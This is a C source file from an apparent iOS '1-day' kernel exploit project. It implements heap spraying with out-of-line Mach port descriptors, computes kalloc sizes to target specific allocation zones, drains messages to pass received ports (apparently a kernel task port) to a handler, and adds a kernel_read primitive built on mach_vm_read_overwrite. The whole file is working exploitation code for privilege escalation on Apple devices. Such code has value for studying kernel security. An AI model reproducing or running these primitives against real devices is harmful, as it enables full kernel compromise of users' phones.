//
//  kernel_alloc.c
//  1_day_iOS
//
//  Created by System on 25/11/2020.
//  Copyright Â© 2020 System. All rights reserved.
//

#include "kernel_alloc.h"


size_t message_size_for_kalloc_size(size_t kalloc_size)
{
    return ((3 * kalloc_size) / 4) - 0x74;
}


size_t
ool_ports_spray_size(mach_port_t *holding_ports, size_t *holding_port_count,
                     size_t message_size, const mach_port_t *ool_ports, size_t ool_port_count,
                     mach_msg_type_name_t ool_disposition, size_t spray_size)
{
    size_t ool_size, ools_per_message, ools_needed;
    //compute_parameters
    
    ool_size = ool_port_count * sizeof(uint64_t);
    size_t max_ools_by_memory = max_ool_memory_per_message / ool_size;
    size_t max_ools_by_message_size =
    (message_size - sizeof(mach_msg_base_t)) / sizeof(mach_msg_ool_ports_descriptor_t);
    size_t max_ools_by_port_limit = max_ool_ports_per_message / ool_port_count;
    
    ools_per_message = min(max_ools_by_memory,
                           min(max_ools_by_message_size, max_ools_by_port_limit));
    ools_needed = (spray_size + ool_size - 1) / ool_size;
    
    ssize_t ools_left = ools_needed;
    size_t sprayed = 0;
    size_t port_count = *holding_port_count;
    size_t ports_used = 0;
    for (; ports_used < port_count && ools_left > 0; ports_used++)
    {
        // Spray this port one message at a time until we've maxed out its queue.
        size_t messages_sent = 0;
        for (; messages_sent < 4 && ools_left > 0; messages_sent++)
        {
            
            // Send a message.
            size_t sent = ool_ports_spray_port(
                                               holding_ports[ports_used],
                                               ool_ports,
                                               ool_port_count,
                                               ool_disposition,
                                               ools_per_message,
                                               message_size,
                                               1);
            // If we couldn't send a message to this port, stop trying to send more
            // messages and move on to the next port.
            if (sent != 1)
            {
                assert(sent == 0);
                break;
            }
            // We sent a full message worth of OOL port descriptors.
            sprayed += ools_per_message * ool_size;
            ools_left -= ools_per_message;
        }
    }
    *holding_port_count = ports_used;
    return sprayed;
}



size_t
ool_ports_spray_port(mach_port_t holding_port,
                     const mach_port_t *ool_ports, size_t port_count,
                     mach_msg_type_name_t ool_disposition, size_t ool_count,
                     size_t message_size, size_t message_count)
{
    
    // Calculate the size of each component.
    struct ool_ports_msg *msg;
    // Sanity checks.
    assert(sizeof(*msg) + ool_count * sizeof(msg->ool_ports[0]) <= message_size);
    assert(port_count * ool_count <= max_ool_ports_per_message);
    assert(message_count <= MACH_PORT_QLIMIT_MAX);
    // Allocate a message containing the required number of OOL ports descriptors.
    msg = (struct ool_ports_msg *)calloc(1, message_size);
    assert(msg != NULL);
    // Trace the kalloc allocations we're about to perform.
    /*
     DEBUG_TRACE(2, "%s: %zu * kalloc(%zu) + %zu * kalloc(%zu)", __func__,
     ool_count * message_count, port_count * sizeof(uint64_t),
     message_count, kalloc_size_for_message_size(message_size));
     */
    // If the user didn't supply any ool_ports, create our own.
    mach_port_t *alloc_ports = NULL;
    if (ool_ports == NULL)
    {
        alloc_ports = (mach_port_t *)calloc(port_count, sizeof(mach_port_t));
        assert(alloc_ports != NULL);
        ool_ports = alloc_ports;
    }
    // Populate the message. Each OOL ports descriptor will be a kalloc.
    msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
    msg->header.msgh_remote_port = holding_port;
    msg->header.msgh_size = (mach_msg_size_t)message_size;
    msg->header.msgh_id = 'ools';
    msg->body.msgh_descriptor_count = (mach_msg_size_t)ool_count;
    mach_msg_ool_ports_descriptor_t ool_descriptor = {};
    ool_descriptor.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    ool_descriptor.address = (void *)ool_ports;
    ool_descriptor.count = (mach_msg_size_t)port_count;
    ool_descriptor.deallocate = FALSE;
    ool_descriptor.copy = MACH_MSG_PHYSICAL_COPY;
    ool_descriptor.disposition = ool_disposition;
    for (size_t i = 0; i < ool_count; i++)
    {
        msg->ool_ports[i] = ool_descriptor;
    }
    // Send the messages.
    size_t messages_sent = 0;
    for (; messages_sent < message_count; messages_sent++)
    {
        kern_return_t kr = mach_msg(
                                    &msg->header,
                                    MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
                                    (mach_msg_size_t)message_size,
                                    0,
                                    MACH_PORT_NULL,
                                    MACH_MSG_TIMEOUT_NONE,
                                    MACH_PORT_NULL);
        if (kr != KERN_SUCCESS)
        {
            printf("ERROR!! %s returned %d: %s", "mach_msg", kr, mach_error_string(kr));
            break;
        }
    }
    
    // Clean up the allocated ports.
    if (alloc_ports != NULL)
    {
        free(alloc_ports);
    }
    // Return the number of messages we sent.
    return messages_sent;
}



void
ool_ports_spray_receive(mach_port_t *holding_ports, size_t holding_port_count,mach_port_t *kernl_task_port,
                        void (^ool_ports_handler)(mach_port_t *, size_t,mach_port_t * )) {
    // Loop through all the ports.
    for (size_t port_index = 0; port_index < holding_port_count; port_index++) {
        // Handle each message on the port.
        port_drain_messages(holding_ports[port_index], ^(mach_msg_header_t *msg0) {
            struct ool_ports_msg *msg = (struct ool_ports_msg *)msg0;
            // We've successfully received a message. Make sure it's the type we
            // expect.
            if (msg->header.msgh_id != 'ools') {
                
                printf("received unexpected message id 0x%x",
                        msg->header.msgh_id);
                goto done;
            }
            if (!MACH_MSGH_BITS_IS_COMPLEX(msg->header.msgh_bits)) {
                printf("skipping non-complex message");
                goto done;
            }
            // Go through the descriptors one at a time passing them to the handler
            // block.
            mach_msg_descriptor_t *d = (mach_msg_descriptor_t *)&msg->ool_ports[0];
            for (size_t i = 0; i < msg->body.msgh_descriptor_count; i++) {
                void *next;
                switch (d->type.type) {
                    case MACH_MSG_OOL_PORTS_DESCRIPTOR:
                        next = &d->ool_ports + 1;
                        mach_port_t *ports = (mach_port_t *)
                        d->ool_ports.address;
                        size_t count = d->ool_ports.count;
                        ool_ports_handler(ports, count,kernl_task_port);
                        break;
                    default:
                        printf("unexpected descriptor type %u",
                                d->type.type);
                        goto done;
                }
                d = (mach_msg_descriptor_t *)next;
            }
        done:
            // Discard the message.
            mach_msg_destroy(&msg->header);
        });
    }
}

void
port_drain_messages(mach_port_t port, void (^message_handler)(mach_msg_header_t *)) {
    kern_return_t kr;
    mach_msg_option_t options = MACH_RCV_MSG | MACH_RCV_LARGE | MACH_RCV_TIMEOUT
    | MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0)
    | MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_NULL);
    // Allocate an initial message buffer.
    mach_msg_size_t msg_size = 0x4000;
    mach_msg_base_t *msg = malloc(msg_size);
    assert(msg != NULL);
    // Loop through all the messages queued on the port.
    for (;;) {
        // Try to receive the message. If the buffer isn't big enough, reallocate
        // and try again. This should only happen twice.
        for (size_t try = 0;; try++) {
            assert(try < 2);
            // Receive the message.
            kr = mach_msg(
                          &msg->header,
                          options,
                          0,
                          msg_size,
                          port,
                          0,
                          MACH_PORT_NULL);
            if (kr != MACH_RCV_LARGE) {
                break;
            }
            // The buffer was too small, increase it.
            msg_size = msg->header.msgh_size + REQUESTED_TRAILER_SIZE(options);
            free(msg);
            msg = malloc(msg_size);
            assert(msg != NULL);
        }
        // If we got an error, stop processing messages on this port. If the error is a
        // timeout, that means that we've exhausted the queue, so don't print an error
        // message.
        if (kr != KERN_SUCCESS) { /// error
            if (kr != MACH_RCV_TIMED_OUT) {
                printf("%s returned %d: %s", "mach_msg", kr, mach_error_string(kr));
            }
            break;
        }
        // Pass the message to the message handler.
        message_handler(&msg->header);
    }
    // Clean up resources.
    free(msg);
}

int kernel_read(uint64_t address, void *data, size_t size, mach_port_t kernel_task_port) {
    mach_vm_size_t size_out;
    kern_return_t kr = mach_vm_read_overwrite(kernel_task_port, address,
                                              size, (mach_vm_address_t) data, &size_out);
    if (kr != KERN_SUCCESS) {
        printf("%s returned %d: %s", "mach_vm_read_overwrite", kr, mach_error_string(kr));
        printf("could not %s address 0x%016llx", "read", address);
        return 0;
    }
    if (size_out != size) {
        printf("partial read of address 0x%016llx: %llu of %zu bytes",
              address, size_out, size);
        return 0;
    }
    return 1;
}
